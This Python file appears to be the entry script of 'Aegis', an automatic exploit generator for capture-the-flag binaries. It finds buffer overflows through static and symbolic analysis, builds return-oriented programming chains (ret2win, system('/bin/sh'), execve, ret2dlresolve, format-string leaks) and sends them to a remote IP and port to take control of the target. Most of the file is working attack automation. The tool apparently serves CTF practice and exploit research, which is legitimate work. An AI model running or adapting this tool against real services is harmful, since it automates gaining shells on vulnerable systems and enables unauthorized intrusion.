#!/usr/bin/env python3
import logging
import argparse
import os

# from rage.log import aegis_log
from pwn import *
from rage.rage import rAEG
from rage.machine import Machine
from rage.against import Against
from rage.log import aegis_log

class Aegis:
    """Class that does the control flow for analysis and execution."""

    def __init__(self, binary, libc, ip, port):
        """Initiaize important variables for the binary."""
        self.binary = os.path.abspath(binary)
        self.elf = ELF(binary)
        if libc is not None:
            self.libc = ELF(libc)
        else:
            self.libc = self.elf.libc

        self.ip = ip
        self.port = port

        self.has_leak = False
        self.has_overflow = False
        self.has_libc_leak = False

        self.symbol = rAEG(self.binary)
        self.machine = Machine(self.binary)
        self.failed = False
        
        self.static_analysis() 
        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)

        self.symbolic_padding = None

    def static_analysis(self):
        """Set variables from the output of the static analysis."""
        self.machine.check_mitigations()
        self.machine.check_vulnerable_copy()
        self.machine.check_vulnerable_input()

    def symbolic_analysis(self):
        """Set variables from the output of the symbolic analysis."""
        self.symbol.stack_smash()
        self.symbolic_padding = self.symbol.symbolic_padding
        return None

    def setup_exploit(self):
        """Choose which exploit to do for the binary."""
        
        win_gadget = self.machine.find_win_gadget()
        function = self.machine.find_functions(["win", "system", "execve", "syscall"])
        string = self.machine.find_string_address()
        printf_addresses = self.machine.check_vulnerable_printf()
        self.against.chain = b""
        writeable = None

        if len(function) > 0:
            function = function[0]
        else:
            function = None

        # Choose the right padding size
        if self.symbolic_padding != None:
            #if self.machine.padding_size == len(self.symbolic_padding):
            self.against.padding = self.symbolic_padding
            if self.failed:
                self.against.padding = b"A" * self.machine.padding_size
        else:
            self.against.padding = b"A" * self.machine.padding_size

        if len(self.against.padding) == 0:
            aegis_log.warning(f"Could not find buffer overflow")
            if printf_addresses:
                self.against.format_leak()
        else: 
            if not string:
                self.against.chain += self.against.rop_chain_write_string(b"/bin/sh", writeable)

            # Check if one call functions are in the binary
            if win_gadget:
                aegis_log.info(f"Setting up return to win with gadget")
                if self.failed:
                    self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                self.against.chain += p64(win_gadget)
            elif function == "win":
                aegis_log.info(f"Setting up return to win with function")
                self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
            elif function == "system":
                aegis_log.info(f"Setting up return to system")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string])
            elif function == "execve":
                aegis_log.info(f"Setting up return to execve")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
            elif function == "syscall":
                aegis_log.info(f"Setting up return to syscall")
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
            else:
                print(self.machine.find_functions(["puts, printf"]))
                if len(self.machine.find_functions(["puts, printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.info(f"Setting up return to puts")
                    self.against.chain = self.against.rop_ret2puts()
                # Check for ret2dlresolve
                elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.info(f"Setting up return to dlresolve")
                    self.against.chain = self.against.rop_chain_dlresolve()
                

        return None

    def write_solve_script(self):
        """Write the solve to a script for writeup purposes."""
        return None

    def exploit(self):
        """Create and run exploit using Against module."""
        p = self.against.start("")
        self.against.send_exploit(p)
        self.against.recieve_flag(p)
        self.against.verify_flag(p)

        return None


def print_title():



    aegis_title = """
  ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████
  ███    ███   ███    ███   ███    ███ ███    ███    ███
  ███    ███   ███    █▀    ███    █▀  ███▌   ███    █▀
  ███    ███  ▄███▄▄▄      ▄███        ███▌   ███
▀███████████ ▀▀███▀▀▀     ▀▀███ ████▄  ███▌ ▀███████████
  ███    ███   ███    █▄    ███    ███ ███           ███
  ███    ███   ███    ███   ███    ███ ███     ▄█    ███
  ███    █▀    ██████████   ████████▀  █▀    ▄████████▀    
    """


    shield_1 = """
                  ██                                          
              ████░░████                                      
          ████░░░░░░░░░░████                                  
      ████░░░░░░░░░░░░░░░░░░████                              
██████░░░░▒▒▒▒░░░░░░░░░░▓▓▓▓░░░░██████                        
██░░░░░░▓▓▒▒▓▓▓▓░░░░░░▓▓▓▓▒▒▓▓░░░░░░██                        
██░░░░░░░░▒▒░░▓▓▓▓▒▒▓▓▓▓░░▓▓░░░░░░░░██                        
██░░░░░░▒▒▓▓░░▒▒▒▒  ▓▓▓▓░░▓▓▒▒░░░░░░██                        
██░░▓▓▓▓▓▓░░▒▒▒▒      ▓▓▓▓░░▓▓▓▓▓▓░░██                        
  ██░░▓▓░░▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓░░▓▓░░██                          
  ██░░▒▒▒▒▓▓      ▒▒      ▒▒▒▒▓▓░░██                          
  ██░░▓▓▓▓▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓░░██                          
  ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                          
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░██                            
      ██░░▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒░░██                              
      ██░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▓▓▓▓░░██                              
        ██░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓░░██                                
          ██░░▓▓░░░░░░▓▓░░██                                  
            ██░░░░░░░░░░██                                    
              ████░░████                                      
                  ██                                          

    """

    print(aegis_title)

if __name__ == "__main__":
    logging.getLogger("angr").setLevel(logging.CRITICAL)
    logging.getLogger("os").setLevel(logging.CRITICAL)
    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
    logging.getLogger("aegis_log").setLevel(logging.INFO)
    parser = argparse.ArgumentParser( 
        prog = "Aegis", 
        description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
    )

    parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
    parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge", default=None)
    parser.add_argument("-port", metavar="port", type=str, help="The port of the remote challenge", default=None)
    parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
    parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
    parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)

    arguments = parser.parse_args()
    print_title()

    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port)
    aeg.static_analysis()
    aeg.symbolic_analysis()
    aeg.setup_exploit()
    aeg.exploit()
